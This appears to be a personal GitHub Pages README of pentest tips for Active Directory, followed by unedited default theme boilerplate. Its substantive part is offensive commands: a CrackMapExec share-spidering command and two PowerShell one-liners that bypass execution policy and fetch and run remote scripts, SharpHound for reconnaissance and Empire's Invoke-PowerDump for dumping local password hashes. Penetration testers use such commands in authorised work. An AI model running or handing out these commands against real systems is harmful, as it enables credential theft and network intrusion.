# Pentest Tips

Some tips from a cybersecurity consultant in France.

## Pentest Active Directory

### CrackMapExec :

Dump all shares :

```markdown
cme smb -u 'XXX' -p 'XXX' -M spider_plus IP_ADDRESS/MASK
```

### PowerShell one-liners

Bloodhound : Using ingestors to collect the data and then send it to BloodHound.

```markdown
powershell.exe -exec Bypass -C "IEX(New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1');Invoke-BloodHound
```

PowerDump : Dump all local accounts :

```markdown
powershell.exe -exec Bypass -C "IEX(New-Object Net.Webclient).DownloadString('https://github.com/EmpireProject/Empire/raw/master/data/module_source/credentials/Invoke-PowerDump.ps1');Invoke-PowerDump
```

# Header 1
## Header 2
### Header 3

- Bulleted
- List

1. Numbered
2. List

**Bold** and _Italic_ and `Code` text

[Link](url) and ![Image](src)
```

For more details see [GitHub Flavored Markdown](https://guides.github.com/features/mastering-markdown/).

### Jekyll Themes

Your Pages site will use the layout and styles from the Jekyll theme you have selected in your [repository settings](https://github.com/aasphixie/aasphixie.github.io/settings/pages). The name of this theme is saved in the Jekyll `_config.yml` configuration file.

### Support or Contact

Having trouble with Pages? Check out our [documentation](https://docs.github.com/categories/github-pages-basics/) or [contact support](https://support.github.com/contact) and we’ll help you sort it out.
